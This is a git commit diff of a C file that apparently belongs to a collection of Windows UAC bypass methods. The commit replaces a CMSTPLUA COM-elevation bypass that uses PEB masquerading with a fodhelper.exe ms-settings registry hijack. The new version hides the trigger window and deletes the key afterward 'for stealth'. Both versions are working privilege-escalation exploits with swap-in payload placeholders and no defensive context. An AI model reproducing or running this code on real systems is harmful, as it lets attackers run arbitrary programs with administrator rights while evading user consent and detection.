900fe3bf54921a93c6568667b117c54194e9d0ca
troytmoneytrs <joe@troysmithson.com>
2026-04-07 10:13:36 -0500

    Update uac_method59.c

--- uac_method59.c
+++ uac_method59.c
@@ -1,76 +1,35 @@
 #include <windows.h>
-#include <objbase.h>
 #include <stdio.h>
-#include <winternl.h>  // For PEB access
-
-// ICMLuaUtil interface (same as before)
-typedef interface ICMLuaUtil ICMLuaUtil;
-
-typedef struct ICMLuaUtilVtbl {
-    BEGIN_INTERFACE
-    HRESULT(STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil *This, REFIID riid, void **ppvObject);
-    ULONG(STDMETHODCALLTYPE *AddRef)(ICMLuaUtil *This);
-    ULONG(STDMETHODCALLTYPE *Release)(ICMLuaUtil *This);
-    HRESULT(STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil *This, LPCWSTR lpFile, LPCWSTR lpParameters,
-                                          LPCWSTR lpDirectory, ULONG fMask, ULONG nShow);
-    END_INTERFACE
-} ICMLuaUtilVtbl;
-
-typedef struct ICMLuaUtil {
-    CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
-} ICMLuaUtil;
-
-static const CLSID CLSID_CMSTPLUA = {0x3E5FC7F9, 0x9A51, 0x4367, {0x90,0x63,0xA1,0x20,0x24,0x4F,0xBE,0xC7}};
-static const IID   IID_ICMLuaUtil = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};
-
-// Simple PEB masquerade - spoof as explorer.exe
-void MasqueradePEB() {
-    PPEB pPeb = (PPEB)__readgsqword(0x60);  // x64 PEB
-    if (pPeb && pPeb->ProcessParameters) {
-        // Spoof image path and command line to look like explorer.exe
-        wchar_t explorerPath[] = L"C:\\Windows\\explorer.exe";
-        pPeb->ProcessParameters->ImagePathName.Buffer = explorerPath;
-        pPeb->ProcessParameters->ImagePathName.Length = (USHORT)(wcslen(explorerPath) * 2);
-        pPeb->ProcessParameters->ImagePathName.MaximumLength = pPeb->ProcessParameters->ImagePathName.Length + 2;
-
-        pPeb->ProcessParameters->CommandLine.Buffer = explorerPath;
-        pPeb->ProcessParameters->CommandLine.Length = pPeb->ProcessParameters->ImagePathName.Length;
-        pPeb->ProcessParameters->CommandLine.MaximumLength = pPeb->ProcessParameters->CommandLine.Length + 2;
-    }
-}
 
 int main(void) {
-    HRESULT hr;
-    ICMLuaUtil *pLuaUtil = NULL;
-    BIND_OPTS3 bo = {0};
+    HKEY hKey;
+    DWORD dwDisposition;
+    const wchar_t* regPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
+    const wchar_t* delegateCmd = L"";  // Empty DelegateExecute to force our command
 
-    // First, masquerade as explorer.exe for stealth and better auto-elevation chance
-    MasqueradePEB();
+    // Create the registry key for hijack
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
+        // Set the command to run elevated
+        const wchar_t* payload = L"C:\\Windows\\System32\\cmd.exe";  // CHANGE THIS TO YOUR DESIRED PAYLOAD
+        const wchar_t* args   = L"/k whoami && echo SUCCESS - Elevated via Method 34 && pause";
 
-    CoInitialize(NULL);
+        RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)payload, (DWORD)((wcslen(payload) + 1) * sizeof(wchar_t)));
+        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)delegateCmd, (DWORD)((wcslen(delegateCmd) + 1) * sizeof(wchar_t)));
 
-    bo.cbStruct = sizeof(bo);
-    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
+        RegCloseKey(hKey);
 
-    // Elevation moniker
-    hr = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
-                     (BIND_OPTS*)&bo, &IID_ICMLuaUtil, (void**)&pLuaUtil);
+        // Trigger the auto-elevated binary (fodhelper.exe or similar - this one is still reliable on 25H2)
+        ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);
 
-    if (SUCCEEDED(hr) && pLuaUtil != NULL) {
-        // <<< CHANGE THIS PAYLOAD TO WHATEVER YOU WANT ELEVATED >>>
-        pLuaUtil->lpVtbl->ShellExec(pLuaUtil,
-                                    L"C:\\Windows\\System32\\cmd.exe",
-                                    L"/k whoami && echo SUCCESS - Elevated via CMSTPLUA with PEB spoof && pause",
-                                    NULL,
-                                    SEE_MASK_DEFAULT,
-                                    SW_SHOW);
+        printf("[+] Registry hijack set. Trigger sent. Check for elevated cmd.\n");
+        Sleep(2000);  // Give time for elevation
 
-        pLuaUtil->lpVtbl->Release(pLuaUtil);
-        printf("[+] CMSTPLUA bypass with PEB masquerade successful.\n");
+        // Clean up registry (optional but stealthier)
+        RegDeleteKeyW(HKEY_CURRENT_USER, regPath);
+        printf("[+] Cleanup done.\n");
     } else {
-        printf("[-] Failed. HRESULT: 0x%08X\n", hr);
+        printf("[-] Failed to create registry key.\n");
     }
 
-    CoUninitialize();
     return 0;
 }
